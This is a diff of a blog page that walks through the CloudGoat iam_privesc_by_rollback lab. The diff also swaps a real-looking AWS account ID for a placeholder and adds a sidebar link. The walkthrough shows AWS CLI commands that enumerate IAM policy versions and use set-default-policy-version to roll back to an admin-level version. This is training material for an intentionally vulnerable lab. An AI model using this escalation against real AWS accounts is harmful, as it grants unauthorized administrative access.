@@ -277,15 +277,15 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="/posts/cloud-security-6/">Hands on Cloud Pentesting: 6 - Cloudgoat sqs_flag_shop</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="/posts/smileyctf-2025/">SmileyCTF 2025 - Sculpture Revenge, dry-ice-n-co</a>
                             </li>
                         
                             <li class="bullet">
                                 <a href="/posts/cloud-security-5/">Hands on Cloud Pentesting: 5 - Cloudgoat lambda_privesc</a>
-                            </li>
-                        
-                            <li class="bullet">
-                                <a href="/posts/cloud-security-4/">Hands on Cloud Pentesting: 4 - Cloudgoat iam_privesc_by_rollback</a>
                             </li>
                         
                     
@@ -465,12 +465,12 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 <p>Lets checkout the policies that are attached to our user and the inline policies.
 <img src="image-1.png" alt="list policies">
 We can see that we have one polilcy - <code>cg-raynor-policy-cgid3j52g8t9w5</code>. Lets try to get that policy. For that, first we need the default version.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#75715e">//aws iam get-policy --profile raynor --policy-arn &#34;arn:aws:iam::139343766080:policy/cg-raynor-policy-cgid3j52g8t9w5&#34;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#75715e">//aws iam get-policy --profile raynor --policy-arn &#34;arn:aws:iam::1234567890:policy/cg-raynor-policy-cgid3j52g8t9w5&#34;
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Policy&#34;</span>: {
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;PolicyName&#34;</span>: <span style="color:#e6db74">&#34;cg-raynor-policy-cgid3j52g8t9w5&#34;</span>,
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;PolicyId&#34;</span>: <span style="color:#e6db74">&#34;ANPASA4MJEJAHRPESWPFA&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Arn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::139343766080:policy/cg-raynor-policy-cgid3j52g8t9w5&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Arn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::1234567890:policy/cg-raynor-policy-cgid3j52g8t9w5&#34;</span>,
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Path&#34;</span>: <span style="color:#e6db74">&#34;/&#34;</span>,
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;DefaultVersionId&#34;</span>: <span style="color:#e6db74">&#34;v1&#34;</span>,
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;AttachmentCount&#34;</span>: <span style="color:#ae81ff">1</span>,
@@ -492,7 +492,7 @@ We can see that we have one polilcy - <code>cg-raynor-policy-cgid3j52g8t9w5</cod
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>The default version is &ldquo;v1&rdquo;</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#75715e">//aws iam get-policy-version --profile raynor --policy-arn &#34;arn:aws:iam::139343766080:policy/cg-raynor-policy-cgid3j52g8t9w5&#34; --version-id v1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#75715e">//aws iam get-policy-version --profile raynor --policy-arn &#34;arn:aws:iam::1234567890:policy/cg-raynor-policy-cgid3j52g8t9w5&#34; --version-id v1
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;PolicyVersion&#34;</span>: {
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Document&#34;</span>: {
@@ -517,7 +517,7 @@ We can see that we have one polilcy - <code>cg-raynor-policy-cgid3j52g8t9w5</cod
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>We are allowed iam:Get*, iam:List* and iam:SetDefaultPolicyVersion on all resources. There is a <a href="https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-iam-privesc.html#iamsetdefaultpolicyversion" target="_blank">privilege escalation vector</a> with iam:SetDefaultPolicyVersion using which, if there are older policy versions with higher permissions, we can set that as the default version and get more permissions than currently allowed.</p>
 <p>For that lets try to see the other versions of the same policy;</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#75715e">//aws iam get-policy-version --profile raynor --policy-arn &#34;arn:aws:iam::139343766080:policy/cg-raynor-policy-cgid3j52g8t9w5&#34; --version-id v2
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#75715e">//aws iam get-policy-version --profile raynor --policy-arn &#34;arn:aws:iam::1234567890:policy/cg-raynor-policy-cgid3j52g8t9w5&#34; --version-id v2
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;PolicyVersion&#34;</span>: {
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Document&#34;</span>: {
@@ -541,7 +541,7 @@ We can see that we have one polilcy - <code>cg-raynor-policy-cgid3j52g8t9w5</cod
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;CreateDate&#34;</span>: <span style="color:#e6db74">&#34;2025-06-12T10:44:58Z&#34;</span>
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#75715e">//aws iam get-policy-version --profile raynor --policy-arn &#34;arn:aws:iam::139343766080:policy/cg-raynor-policy-cgid3j52g8t9w5&#34; --version-id v3
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#75715e">//aws iam get-policy-version --profile raynor --policy-arn &#34;arn:aws:iam::1234567890:policy/cg-raynor-policy-cgid3j52g8t9w5&#34; --version-id v3
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;PolicyVersion&#34;</span>: {
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Document&#34;</span>: {
@@ -560,7 +560,7 @@ We can see that we have one polilcy - <code>cg-raynor-policy-cgid3j52g8t9w5</cod
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>This version, &ldquo;v3&rdquo; has the policy statement to Allow all Actions on all Resources, which is basically admin privileges so now lets set this policy as the default version.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws iam set-default-policy-version --policy-arn <span style="color:#e6db74">&#34;arn:aws:iam::139343766080:policy/cg-raynor-policy-cgid3j52g8t9w5&#34;</span> --version-id v3 --profile raynor
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws iam set-default-policy-version --policy-arn <span style="color:#e6db74">&#34;arn:aws:iam::1234567890:policy/cg-raynor-policy-cgid3j52g8t9w5&#34;</span> --version-id v3 --profile raynor
 </span></span></code></pre></div><p>After that when we try to get the policy, we can see that the default version has changed and the Scenario Goal is achieved.
 <img src="image-2.png" alt="goal achieved"></p>
 <p>Stop the scenario using the following command.</p>
@@ -578,6 +578,13 @@ We can see that we have one polilcy - <code>cg-raynor-policy-cgid3j52g8t9w5</cod
         <ul class="series">
             
             
+            
+            <li>
+                June 18, 2025 -
+                
+                    <a href="/posts/cloud-security-6/">Hands on Cloud Pentesting: 6 - Cloudgoat sqs_flag_shop</a>
+                
+            </li>
             
             <li>
                 June 13, 2025 -
